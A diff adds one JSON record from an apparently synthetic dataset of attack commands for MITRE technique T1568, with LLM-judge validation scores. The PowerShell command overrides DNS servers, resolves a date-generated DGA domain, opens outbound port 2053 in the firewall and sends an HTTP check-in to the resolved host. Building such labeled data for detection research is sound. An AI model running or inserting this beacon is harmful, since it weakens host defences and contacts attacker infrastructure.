@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $iface=(Get-DnsClient | Where-Object { $_.AddressFamily -eq 'IPv4' -and -not $_.InterfaceAlias.Contains('Loopback') } | Select-Object -First 1).InterfaceIndex; if($iface){ Set-DnsClientServerAddress -InterfaceIndex $iface -ServerAddresses @('1.1.1.1','9.9.9.9') -Validate; Clear-DnsClientCache; $dom=('edge{0}-{1}.updn.net' -f (Get-Random -Min 10 -Max 99),(Get-Date -Format 'yyDDD')); $ip=(Resolve-DnsName $dom -Type A -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress; if($ip){ netsh advfirewall firewall add rule name='out_2053' dir=out action=allow protocol=TCP remoteport=2053 | Out-Null; Invoke-WebRequest -Uri ('http://{0}:2053/hello' -f $ip) -Headers @{ Host=$dom } -TimeoutSec 5 -UseBasicParsing } } }",
+  "explanation": "Sets trusted DNS servers on the active interface, clears cache, resolves a DGA host, opens uncommon port 2053, and performs an HTTP check-in to the resolved IP using Host routing.",
+  "rationale_steps": [
+    "Temporarily direct DNS to specific resolvers for consistent answers.",
+    "Generate a time-based DGA domain and resolve it.",
+    "Permit outbound connectivity to a non-standard port.",
+    "Initiate a check-in using Host header for domain continuity."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-76c8a0cd",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax throughout, and appropriate error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by configuring DNS servers, using a DGA-like domain generation pattern with date-based components, resolving the domain, creating a firewall rule, and establishing communication on an uncommon port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:27:18.644418Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced syntax, valid PowerShell cmdlets and `netsh` usage, correct argument passing, and proper use of semicolons for command separation.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly implements dynamic domain generation and resolution characteristic of T1568, the critical steps to set DNS servers, clear the system DNS cache, and add a firewall rule will fail due to the specified 'Privilege: None,' making the overall operational flow largely implausible as described.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:27:34.997730Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced braces/quotes, valid cmdlets/parameters, and correct separators.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements dynamic resolution via algorithmically generated domain and follow-on contact aligning with T1568, but DNS server change and firewall rule creation likely require admin and may fail under stated privilege.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T07:28:08.335128Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
